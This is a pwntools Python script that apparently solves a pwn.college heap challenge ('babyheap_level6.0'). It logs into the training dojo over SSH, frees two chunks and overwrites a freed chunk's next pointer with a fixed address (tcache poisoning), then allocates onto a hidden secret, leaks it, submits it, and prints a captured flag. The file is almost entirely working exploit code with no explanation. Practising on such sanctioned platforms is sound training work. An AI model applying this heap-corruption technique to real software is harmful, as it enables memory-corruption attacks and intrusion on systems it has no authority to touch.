from pwn import *

def _malloc(index, size):
    io.sendlineafter(b": ", b"malloc")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ",  str(size).encode())

def _free(index):
    io.sendlineafter(b": ", b"free")
    io.sendlineafter(b"Index: ", str(index).encode())

def _puts(index):
    io.sendlineafter(b": ", b"puts")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b'Data: ')
    return io.recvline().strip()

def _scanf(index, data):
    io.sendlineafter(b": ", b"scanf")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendline(data)

def _send_flag(sec):
    io.sendlineafter(b": ", b"send_flag")
    io.sendlineafter(b"Secret: ", sec)
    io.recvuntil(b'You win! Here is your flag:\n')
    return io.recvline().strip().decode()


secret_pos = 0x42c263
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
io = s.process("/challenge/babyheap_level6.0")

_malloc(0, 64); _malloc(1, 64)
_free(1); _free(0)

_scanf(0, p64(secret_pos))
_malloc(2, 64); _malloc(3, 64)

secret = _puts(3)
info("Leak secret: " + secret)

flag = _send_flag(secret)
info("Flag: " + flag)

s.close()
# Flag: pwn.college{8E-9iZr6-0rrQnqP4nJlt7I2bKa.0VM4MDLxIjNyEzW}